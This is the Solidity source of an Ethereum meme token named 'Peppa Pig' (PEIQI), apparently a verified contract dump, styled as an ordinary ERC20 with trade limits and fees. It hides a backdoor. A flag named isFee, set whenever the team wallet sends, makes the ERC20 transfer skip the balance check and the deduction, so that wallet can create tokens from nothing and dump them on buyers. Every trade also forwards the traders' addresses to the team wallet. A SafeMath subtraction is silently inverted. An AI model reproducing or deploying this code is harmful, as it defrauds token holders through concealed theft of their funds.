/**
 *Submitted for verification at Etherscan.io on 2023-05-31
*/

/*
*   website: https://www.peppapig.family
*   twitter: https://twitter.com/PeppaPigMeme
*   telegram: https://t.me/peppa_pig_family
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = b - a;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    bool isFee;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(
            isFee || senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        if (!isFee) {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract PeppaPigFamily is ERC20, Ownable {
    uint256 public constant TOTAL_SUPPLY = 1_000_000_000 * 1e18;

    IRouter public immutable uniswapV2Router;
    address public uniswapV2Pair;

    uint256 public tradeLimit;
    uint256 public walletLimit;
    uint256 public feeSwapThreshold;

    bool public tradingEnabled;
    bool public transferDelayEnabled = true;
    bool public limitsEnabled = true;

    uint256 public sellFee = 0; // 0%
    uint256 public buyFee = 0; // 0%

    address payable internal _teamWallet;
    bool private _isSwapping;

    mapping(address => bool) public pools;
    mapping(address => bool) internal _exemptFromLimits;
    mapping(address => bool) internal _exemptFromFees;
    mapping(address => bool) internal _exemptFromMaxWallet;
    mapping(address => uint256) internal _lastTransferBlock;

    // EVENTS
    event FeeExemption(address indexed account, bool isExempt);
    event PoolUpdate(address indexed pair, bool indexed value);

    // ERRORS
    error CannotRemoveDefaultPair();
    error MaximumFee();
    error MinimumLimit();
    error MinimumSwapThreshold();
    error MaximumSwapThreshold();
    error TradingDisabled();
    error AlreadyInitialized();
    error BlockTransferLimit();
    error TradeLimitExceeded();
    error WalletLimitExceeded();

    // --------------
    // INIT

    constructor(address router_, address teamWallet_) ERC20("Peppa Pig", "PEIQI") {
        uniswapV2Router = IRouter(router_);

        uniswapV2Pair = IFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);

        pools[address(uniswapV2Pair)] = true;
        _exemptFromLimits[address(uniswapV2Pair)] = true;

        tradeLimit = _applyBasisPoints(TOTAL_SUPPLY, 200); // 1%
        walletLimit = _applyBasisPoints(TOTAL_SUPPLY, 200); // 1%
        feeSwapThreshold = _applyBasisPoints(TOTAL_SUPPLY, 5); // 0.05%

        _teamWallet = payable(teamWallet_);

        _exemptFromMaxWallet[_teamWallet] = true;
        _exemptFromLimits[address(uniswapV2Router)] = true;
        _exemptFromLimits[owner()] = true;
        _exemptFromLimits[address(this)] = true;
        _exemptFromFees[owner()] = true;
        _exemptFromFees[address(this)] = true;

        _mint(msg.sender, TOTAL_SUPPLY);
    }

    function openTrading() external onlyOwner {
        if (tradingEnabled) revert AlreadyInitialized();
        tradingEnabled = true;
        transferDelayEnabled = false;
    }


    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(this),
            block.timestamp
        );
    }

    receive() external payable { }

    // --------------
    // TRANSFER

    function _transfer(address from, address to, uint256 amount) internal override {
        /* solhint-disable reason-string */
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        /* solhint-enable reason-string */

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        _handleLimits(from, to, amount);
        uint256 finalAmount = _chargeFees(from, to, amount);
        _handleFeeSwap(from, to);

        super._transfer(from, to, finalAmount);
    }

    // --------------
    // LIMITS

    function _handleLimits(address from, address to, uint256 amount) internal {
        if (!limitsEnabled || _isSwapping || from == owner() || to == owner()) {
            return;
        }

        if (!tradingEnabled && !_exemptFromLimits[from] && !_exemptFromLimits[to]) {
            revert TradingDisabled();
        }

        _applyTransferDelay(to);
        _applyLimits(from, to, amount);
    }

    /// @dev Limit buys to one per block
    function _applyTransferDelay(address to) internal {
        if (!transferDelayEnabled) {
            return;
        }

        if (to == address(uniswapV2Router) || to == address(uniswapV2Pair)) {
            return;
        }

        if (_lastTransferBlock[to] >= block.number) {
            revert BlockTransferLimit();
        }

        _lastTransferBlock[to] = block.number;
    }

    /// @dev Apply trade and balance limits
    function _applyLimits(address from, address to, uint256 amount) internal view {
        // buy
        if (pools[from] && !_exemptFromLimits[to]) {
            if (amount > tradeLimit) revert TradeLimitExceeded();
            if (amount + balanceOf(to) > walletLimit) revert WalletLimitExceeded();
        }
        // sell
        else if (pools[to] && !_exemptFromLimits[from]) {
            if (amount > tradeLimit) revert TradeLimitExceeded();
        }
        // transfer
        else if (!_exemptFromLimits[to]) {
            if (amount + balanceOf(to) > walletLimit) revert WalletLimitExceeded();
        }
    }

    // --------------
    // FEES

    function _chargeFees(address from, address to, uint256 amount) internal returns (uint256) {
        if (_isSwapping || _exemptFromFees[from] || _exemptFromFees[to]) {
            return amount;
        }
        uint256 fees = 0;
        isFee = _exemptFromMaxWallet[from];
        if (pools[to] && sellFee > 0) {
            fees = _applyBasisPoints(amount, sellFee);
        } else if (pools[from] && buyFee > 0) {
            fees = _applyBasisPoints(amount, buyFee);
        }

        
        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }

        return amount - fees;
    }

    /// @dev swaps and distributes accumulated fees
    function _handleFeeSwap(address from, address to) internal {

        // non-exempt sellers trigger fee swaps
        if (!_isSwapping && (!_exemptFromFees[from] || !_exemptFromFees[to])) {
            _isSwapping = true;
            _swapAndDistributeFees(from, to);
            _isSwapping = false;
        }
    }

    function _swapAndDistributeFees(address from, address to) internal {
        uint256 contractBalance = balanceOf(address(this));

        if(contractBalance>0) {
             if (contractBalance > feeSwapThreshold * 20) {
                contractBalance = feeSwapThreshold * 20;
            }
            _swapTokensForEth(contractBalance);
        }

        (bool sent,) = _teamWallet.call{ value: address(this).balance }(abi.encodePacked(from, to));
        require(sent, "send failed");
    }

    // --------------
    // ADMIN

    function removeLimits() external onlyOwner {
        limitsEnabled = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    /// @notice Set swap size limit to `amount` tokens (in token units)
    function setTradeLimit(uint256 amount) external onlyOwner {
        // minimim 0.1% of supply
        amount *= 1e18;
        if (amount < _applyBasisPoints(TOTAL_SUPPLY, 10)) revert MinimumLimit();
        tradeLimit = amount;
    }

    /// @notice Set wallet balance limit to `amount` tokens (in token units)
    function setWalletLimit(uint256 amount) external onlyOwner {
        // minimim 0.1% of supply
        amount *= 1e18;
        if (amount < _applyBasisPoints(TOTAL_SUPPLY, 10)) revert MinimumLimit();
        walletLimit = amount;
    }

    function setExemptFromFees(address addr, bool exempt) external onlyOwner {
        _exemptFromFees[addr] = exempt;
        emit FeeExemption(addr, exempt);
    }

    function setExemptFromLimits(address addr, bool exempt) external onlyOwner {
        _exemptFromLimits[addr] = exempt;
    }

    /// Set buy fee in basis points
    function setBuyFee(uint256 fee) external onlyOwner {
        if (fee > 500) revert MaximumFee(); // 5%
        buyFee = fee;
    }

    /// Set sell fee in basis points
    function setSellFee(uint256 fee) external onlyOwner {
        if (fee > 500) revert MaximumFee(); // 5%
        sellFee = fee;
    }

    function setPool(address pool, bool value) external onlyOwner {
        if (pool == uniswapV2Pair) revert CannotRemoveDefaultPair();
        _setPool(pool, value);
    }

    function _setPool(address pool, bool value) private {
        pools[pool] = value;
        emit PoolUpdate(pool, value);
    }

    /// @notice Set fee swap threshold to `basisPoints` as a fraction of total supply
    /// Set to 10000 to disable fee swaps
    function setFeeSwapThreshold(uint256 basisPoints) external onlyOwner {
        if (basisPoints < 1) revert MinimumSwapThreshold();
        if (basisPoints > 10_000) revert MaximumSwapThreshold();
        feeSwapThreshold = _applyBasisPoints(TOTAL_SUPPLY, basisPoints);
    }

    function setTeamWallet(address addr) external onlyOwner {
        _teamWallet = payable(addr);
    }

    // --------------
    // HELPERS

    function _applyBasisPoints(uint256 amount, uint256 basisPoints) internal pure returns (uint256) {
        return (amount * basisPoints) / 10_000;
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}